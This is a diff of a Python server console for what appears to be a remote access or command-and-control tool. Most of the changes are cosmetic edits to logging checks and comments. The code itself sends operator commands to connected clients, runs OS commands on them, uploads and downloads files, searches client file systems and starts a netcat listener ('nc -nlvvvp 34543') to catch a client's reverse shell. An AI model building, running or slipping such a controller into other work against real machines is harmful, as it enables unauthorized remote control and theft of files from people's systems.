@@ -255,7 +255,7 @@ def mysendall(socket, data, delimiter):
     :delimiter: a string used to denote the end of a transmission
     """
     E_data = base64.b64encode(data) + delimiter
-    if log== True:
+    if log == True:
         logger(data.decode()+'\n')
     return socket.sendall(E_data)
 
@@ -277,7 +277,7 @@ def myrecvall(socket, delimiter):
     # base 64 decode and convert the bytes to a string
     D_data = base64.b64decode(data[:-len(delimiter)])
     # now we return the decoded data that was received from the client
-    if log:
+    if log == True:
         logger(D_data.decode()+'\n')
     return D_data
 
@@ -295,11 +295,11 @@ def upload(socket, delimiter):
     while True:
         # Get file name from user
         print("{}[-]{} Please provide the absolute path for the server file".format(lt_prpl, stop))
-        if log:
+        if log == True:
             logger('-'*50+"\n[-] Start upload function\n")
             logger("{}[-]{} Please provide the absolute path for the server file\n".format(lt_prpl, stop))
         filename = input("{}[-]{} What is the server file?> ".format(lt_prpl, stop))
-        if log:
+        if log == True:
             logger("{}[-]{} What is the server file?>\n".format(lt_prpl, stop))
         # Try to open the file in read binary mode to send to the client
         try:
@@ -310,17 +310,18 @@ def upload(socket, delimiter):
         except Exception as e:
             # If there is an error print the error to the server user
             E_msg = '{}[-]{} ERROR:\nTried to open {}\nReceived Error: {}\n'.format(lt_rd, stop, filename, str(e))
-            if log:
+            if log == True:
                 logger(E_msg)
             print(E_msg)
             # Once we print the error start the loop again.
             continue 
         else: 
-            # Get the location from the user and encode it as bytes
             path = '{}[-]{} Please provide the absolute path of the client destination'.format(lt_prpl, stop)
+            # Print the message
             print(path)
+            # Get the location from the user and encode it as bytes
             target_loc = input("{}[-]{} What is the client destination?> ".format(lt_prpl, stop))
-            if log:
+            if log == True:
                 logger(path+'\n')
                 logger('{}[-]{} What is the client destination?> \n'.format(lt_prpl, stop))
             target_loc = target_loc.encode()
@@ -340,12 +341,12 @@ def upload(socket, delimiter):
     c_response = myrecvall(socket, delimiter).decode()
     if '[!] ERROR' in c_response:
         e_msg = "{}[-]{} ERROR:{}\n".format(lt_rd, stop, c_response)
-        if log: 
+        if log == True: 
             logger(e_msg)
         print(e_msg)
     else:
         print(c_response)
-    if log:
+    if log == True:
         logger('[-] End upload function\n'+'-'*50+'\n')
    
 
@@ -361,13 +362,13 @@ def searcher(socket, delimiter):
     :results: a list of results received from the client
     """
     # We check it there is logging or not, if there is logging we log the data in parentheses
-    if log:
+    if log == True:
         logger('-'*50+"\n[-] Start search function\n")
     # Print the receive message
     print(myrecvall(socket, delimiter).decode())
     # We will get the file location to start the search and encode it
     file_loc = input("{}[-]{} Where should we start looking?> ".format(magenta, stop)).encode()
-    if log:
+    if log == True:
         logger("{}[-]{} Where should we start looking?>\n".format(magenta, stop))
     # We send the file location to the client to start the search
     mysendall(socket, file_loc, delimiter)
@@ -376,7 +377,7 @@ def searcher(socket, delimiter):
     # We ask the user if the file name is known and encode the response
     data = input('{}[-]{} Do you know the file name?> '.format(magenta, stop)).encode()
     
-    if log:
+    if log == True:
         logger('{}[-]{} Do you know the file name?>\n'.format(magenta, stop))
     # We send that data to the client
     mysendall(socket, data, delimiter)
@@ -387,16 +388,18 @@ def searcher(socket, delimiter):
     # if the name is known we get the name and send it to the client
     if 'y' in known:
         data = input('{}[-]{} What is the file name?> '.format(magenta, stop)).encode()
-        if log:
+        if log == True:
             logger('{}[-]{} What is the file name?>\n'.format(magenta, stop))
+        # Send the name to the client
         mysendall(socket, data, delimiter)
     else:
         # If the name is unknown we send unknown to the client
         data = '{}[-]{} Unknown'.format(magenta, stop).encode()
+        
         mysendall(socket, data, delimiter)
     # We tell the user that we are starting the search
     print("{}[-]{} Searching for file...".format(magenta, stop))
-    if log:
+    if log == True:
         logger("{}[-]{} Searching for file...\n".format(magenta, stop))
     # Receive the number of matches from the search
     length = myrecvall(socket, delimiter).decode()
@@ -427,7 +430,7 @@ def searcher(socket, delimiter):
             # Print the match to the screen for the user
             file_name, file_hash = match.split('--')
             print('{0}[!]{1} Match: {2}\n    --{3}'.format(magenta, stop, file_name, file_hash))
-            if log:
+            if log == True:
                 logger('{0}[!]{1} Match: {2}\n    --{3}\n'.format(magenta, stop, file_name, file_hash))
             # Append the match to the list for later
             results.append(match)
@@ -437,7 +440,8 @@ def searcher(socket, delimiter):
             mysendall(socket, data, delimiter)
         # Print the command complete message
         print(myrecvall(socket, delimiter).decode())
-    if log:
+    if log == True:
+        # Indicate end of search function for log
         logger('[-] End search function\n'+'-'*50+'\n')
 
 
@@ -624,13 +628,13 @@ def download(socket, delimiter):
     :data: The data being sent between server/client
     :delimiter: a string used to denote the end of a transmission
     """
-    if log:
+    if log == True:
         logger('-'*50+'\n[-] Start download function\n')
     # Receive the file path comment from client
     print(myrecvall(socket, delimiter).decode())
     # Tell the user to provide the full path for the file
     print('{}[-]{} Please provide the absolute path for the client file'.format(lt_prpl, stop))
-    if log:
+    if log == True:
         logger('{}[-]{} Please provide the absolute path for the client file'.format(lt_prpl, stop))
         logger('{}[-]{} What is the client file?> '.format(lt_prpl, stop))
     # We are getting the file path from the user
@@ -646,14 +650,14 @@ def download(socket, delimiter):
     # file in binary mode at the location.
     else:
         print('{}[-]{} Please provide the absolute path to the server destination'.format(lt_prpl, stop))
-        if log:
+        if log == True:
             logger('{}[-]{} Please provide the absolute path to the server destination\n'.format(lt_prpl, stop))
             logger("{}[-]{} What is the server destination?> \n".format(lt_prpl, stop))
         theFile = input("{}[-]{} What is the server destination?> ".format(lt_prpl, stop))
         with open(theFile, 'w') as outFile:
             outFile.write(recvd)
     print("{}[-]{} File successfully downloaded to: {}".format(lt_prpl, stop, theFile))
-    if log:
+    if log == True:
         logger("{}[-]{} File successfully downloaded to: {}\n".format(lt_prpl, stop, theFile))
     # This will sync the server and client
     data = '{}[-]{} Next'.format(lt_prpl, stop).encode()
@@ -661,7 +665,7 @@ def download(socket, delimiter):
     mysendall(socket, data, delimiter)
     # Now we print the message from the client
     print(myrecvall(socket, delimiter).decode())
-    if log:
+    if log == True:
         logger('[-] End download function\n'+'-'*50+'\n')
 
 
@@ -674,7 +678,7 @@ def command(socket, data, delimiter):
     :s_prompt: The string at the start of every command
     :delimiter: a string used to denote the end of a transmission
     """
-    if log:
+    if log == True:
         logger('-'*50+'\n[-] Start command function\n')
     # Initialize a value for start of while loop
     # We print that the client is ready for the command
@@ -698,11 +702,11 @@ def command(socket, data, delimiter):
         output = myrecvall(socket,delimiter).decode()  
         if output.startswith("[!] ERROR") or output.startswith('[!] No'):
             print(output+'\n')
-            if log:
+            if log == True:
                 logger(output+'\n')
         else:
             print('{}[-]{} Command output: '.format(trquise, stop))
-            if log:
+            if log == True:
                 logger('{}[-]{} Command output:\n'.format(trquise, stop))
             print(output) 
         # Now we tell the client we are ready for the next command
@@ -710,12 +714,12 @@ def command(socket, data, delimiter):
         mysendall(socket, data, delimiter)  
         # We recieve the client message
         print('\n'+myrecvall(socket,delimiter).decode()) 
-    if log:
+    if log == True:
         logger('[-] End command function'+'\n'+'-'*50+'\n')
         
 
 def shell(socket, delimiter):
-    if log:
+    if log == True:
         logger('-'*50+'\n[-] Start shell function\n')
     client_msg = myrecvall(socket,delimiter).decode()
     if client_msg.startswith('win'):
@@ -729,12 +733,12 @@ def shell(socket, delimiter):
             subprocess.call('nc -nlvvvp 34543', shell=True)
         except KeyboardInterrupt:
             print('{}[-]{} Exiting client shell'.format(cyan, stop))
-            if log:
+            if log == True:
                 logger('{}[-]{} Exiting client shell'.format(cyan, stop))
             print(myrecvall(socket, delimiter).decode())
         else:
             print(myrecvall(socket, delimiter).decode())
-    if log:
+    if log == True:
         logger('[-] End shell function'+'-'*50+'\n')
 
 def multi(socket, delimiter, addr):
@@ -748,7 +752,7 @@ def multi(socket, delimiter, addr):
     :prompt: A string identifying the username, ip and directory
     :type_e: the data type of the error received
     """
-    if log:
+    if log == True:
         logger('-'*50+'\n[-] Start multi function')
     data = b''
     while data != b'bk':
@@ -757,7 +761,7 @@ def multi(socket, delimiter, addr):
         except Exception as e:
             type_e = str(type(e)).split()[1].split(">")[0]
             print('{0}[-]{1} Multi Function Error: \n  --Error type: {2}\n  --Error: {3}'.format(trquise, stop, type_e, e))
-            if log:
+            if log == True:
                 logger('{0}[-]{1} Multi Function Error: \n  --Error type: {2}\n  --Error: {3}\n'.format(trquise, stop, type_e, e))
             data = b'back'            
         # split the information received and use the name and working dir as prompt
@@ -765,7 +769,7 @@ def multi(socket, delimiter, addr):
         # We print the server commands
         print('{0}[-]{1} Enter shell command or type bk to go back'.format(trquise, stop))
         prompt = '{3}[!]{4} {0}@{1}: {2}> '.format(client_name, addr, client_CWD, trquise, stop)
-        if log:
+        if log == True:
             logger('{0}[-]{1} Enter shell command or type bk to go back\n'.format(trquise, stop))
             logger(prompt+'\n')
         data = input(prompt).encode()
@@ -777,7 +781,7 @@ def multi(socket, delimiter, addr):
             command(socket, data, delimiter)
             # Wait for the next server command
             continue
-    if log:
+    if log == True:
         logger('[-] End multi function\n'+'-'*50+'\n')
 
 
@@ -815,7 +819,7 @@ def main():
     qt  - quit
     ex  - exit
 """.format(wht, stop)
-    if log:
+    if log == True:
         logger('='*50+'\n[-] Server log started at: {}\n'.format(datetime.datetime.now()))
     # We will set the constants for our
     ports = [8888, 7777, 6666, 5555]
@@ -831,7 +835,7 @@ def main():
         try:
             time.sleep(1)
             print("{}[-]{} Binding port: {}".format(wht, stop, port))  # Identify the port for connection
-            if log:
+            if log == True:
                 logger("{}[-]{} Binding port: {}\n".format(wht, stop, port))  # Identify the port for connection
             srvr.bind((ip, port))  # Bind to the ip and port from user input
         except socket.error:
@@ -846,14 +850,14 @@ def main():
         # If the client drops the server will remain up.
         while True:
             print("{}[-]{} Listening for connections on 0.0.0.0 ...".format(wht, stop))
-            if log:
+            if log == True:
                 logger("{}[-]{} Listening for connections on 0.0.0.0 ...\n".format(wht, stop))
             # we will now use the accept method once a client reaches out
             conn, addr = srvr.accept()
             ip_addr = addr[0]
             # Print that a connection has occurrd
             print("{}[-]{} Connection established with client at {} !".format(wht, stop, str(ip_addr)))
-            if log:
+            if log == True:
                 logger("{}[-]{} Connection established with client at {}!\n".format(wht, stop, str(ip_addr)))
             # Initialize an internal while loop for data handling
             data = b'start'
@@ -865,11 +869,11 @@ def main():
                 # split the information received and use the name and working dir as prompt
                 client_name, client_CWD = client_info.split(';')
                 print('{}[-]{} Enter server command or press ? for server command list'.format(wht, stop))
-                if log:
+                if log == True:
                     logger('{}[-]{} Enter server command or press ? for server command list\n'.format(wht, stop))
                 # We print the server commands
                 prompt = '{3}[-]{4} {0}@{1}: {2}> '.format(client_name, ip_addr, client_CWD, wht, stop)
-                if log:
+                if log == True:
                     logger('{3}[-]{4} {0}@{1}: {2}>\n'.format(client_name, ip_addr, client_CWD, wht, stop))
                 # Now we have our prompt: {}[-]{} user@ip:working_directory>
                 # This will take the byte encoded input 
@@ -899,7 +903,7 @@ def main():
                             pass
                         else:
                             print('    {0}{2}{1} {3}'.format(magenta, stop, cmd_list.index(cmd), cmd))
-                            if log:
+                            if log == True:
                                 logger('    {0}{2}{1} {3}\n'.format(magenta, stop, cmd_list.index(cmd), cmd))
                     continue
                 elif data == b'dc':
@@ -937,15 +941,15 @@ def main():
                 elif data == b'cmd':
                     print(myrecvall(conn, delimiter).decode())
                     ask = input('{}[-]{} s - single or m - multiple:> '.format(trquise, stop)).strip()
-                    if log:
+                    if log == True:
                         logger('{}[-]{} s - single or m - multiple:>\n'.format(trquise, stop))
                     mysendall(conn, ask.encode(), delimiter)
                     if ask.lower().startswith('s'):
                         print('{}[-]{} Enter os command or type bk to go back'.format(trquise, stop))
-                        if log:
+                        if log == True:
                             logger('{}[-]{} Enter os command or type bk to go back\n'.format(trquise, stop))
                         data = input('{}[-]{} What command:> '.format(trquise, stop)).strip().encode()
-                        if log:
+                        if log == True:
                             logger('{}[-]{} What command:>\n'.format(trquise, stop))
                         # Enter the command function to run commands
                         command(conn, data, delimiter)
@@ -964,7 +968,7 @@ def main():
                     # Print the disconnection message from the client
                     print(myrecvall(conn, delimiter).decode())
                     # Wait for one second before clearing screen
-                    if log:
+                    if log == True:
                         logger('[-] Server log end at: {}\n'.format(datetime.datetime.now())+'='*50+'\n')
                     time.sleep(1)
                     # Clear the screen 
@@ -980,7 +984,7 @@ def main():
     except KeyboardInterrupt:
         # If a ctrl + c is enterd we print the message
         print("\n{}[-]{} Good Day Sir! I said good day!".format(wht, stop))  
-        if log:
+        if log == True:
             logger("{}[-]{} Good Day Sir! I said good day!".format(wht, stop))  
             logger('[-] Server log end at: {}'.format(datetime.datetime.now())+'\n'+'='*50+'\n')
         # Close the server object
@@ -993,7 +997,7 @@ def main():
         data = '{0}[-]{1} Main Function Error: \n  --ERROR TYPE: {2} \n  --ERROR:{3}'.format(lt_rd, stop, type_e, str(e))
         print(data)
         # Close the server object
-        if log:
+        if log == True:
             logger('\n'+data+'\n')
             logger('[-] Server log end at: {}\n'.format(datetime.datetime.now())+'\n'+'='*50+'\n')
         srvr.close()
